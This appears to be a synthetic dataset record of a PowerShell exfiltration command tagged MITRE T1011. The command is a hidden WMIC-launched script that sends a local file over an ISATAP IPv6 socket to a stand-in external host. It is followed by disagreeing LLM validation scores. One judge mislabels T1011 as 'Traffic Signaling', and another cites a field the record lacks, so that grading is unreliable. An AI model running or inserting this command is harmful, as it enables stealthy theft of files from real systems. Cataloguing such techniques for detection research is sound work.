@@ -1,0 +1,49 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "wmic process call create \"powershell -NoProfile -WindowStyle Hidden -Command `$ifc=Get-WmiObject Win32_NetworkAdapterConfiguration | ?{ `$_.IPEnabled -and (`$_.Description -like '*ISATAP*') }; if(`$ifc){ `$ip6=@(`$ifc.IPAddress | ?{ `$_ -like '*:*' })[0]; if(`$ip6){ `$c=New-Object Net.Sockets.TcpClient([Net.Sockets.AddressFamily]::InterNetworkV6); `$c.Client.Bind((New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(`$ip6),0))); `$rv6=[Net.IPAddress]::Parse('2001:db8:1::30'); `$c.Connect(`$rv6,58222); `$s=`$c.GetStream(); `$b=[IO.File]::ReadAllBytes('C:\\Users\\Public\\Music\\media.tmp'); `$s.Write(`$b,0,`$b.Length); `$s.Close(); `$c.Close() } }\"",
+  "explanation": "Uses WMIC to execute PowerShell that binds to an ISATAP IPv6 interface, then exfiltrates data over IPv6 to a non-standard port. This leverages an IPv6 transition mechanism as an alternate network medium per T1011.",
+  "rationale_steps": [
+    "Discover ISATAP adapter and collect an IPv6 address.",
+    "Bind an IPv6 TCP client to the ISATAP address.",
+    "Connect to an external IPv6 endpoint over a high port.",
+    "Send file contents using the ISATAP path, distinct from the primary channel.",
+    "Avoid permanent system configuration changes."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-987933e0-27222a53",
+  "source_prompt_hash": "987933e0",
+  "timestamp_utc": "2025-09-30T08:13:32.291694Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 2,
+        "syntactic_justification": "Although quoting and delimiters are balanced, the pervasive backtick-escaped dollar signs (e.g., `$ifc, `$_) will likely break PowerShell variable parsing when invoked via wmic, causing execution failures.",
+        "semantic_score": 2,
+        "semantic_justification": "The command performs direct IPv6 TCP exfiltration via an ISATAP-bound socket, which aligns with alternate-medium exfiltration rather than covert signaling behaviors defined in T1011 (Traffic Signaling).",
+        "combined_score": 2.0,
+        "confidence": 0.7,
+        "timestamp": "2025-10-01T18:55:27.018802Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, using correct WMIC syntax, properly escaped PowerShell variables with backticks for the `-Command` string, and balanced quotes, parentheses, and braces throughout.",
+        "semantic_score": 4,
+        "semantic_justification": "The PowerShell logic precisely implements the claimed ISATAP IPv6 exfiltration, which aligns well with the 'alternate network medium' and 'evade monitoring' aspects of T1011, but the `wmic process call create` component generally requires elevated privileges, contradicting the stated 'Privilege: None' and creating a minor realism gap for the command's full execution as described.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T18:56:02.988380Z"
+      }
+    ],
+    "llm_average_syntactic": 3.5,
+    "llm_average_semantic": 3.0,
+    "llm_average_score": 3.25,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
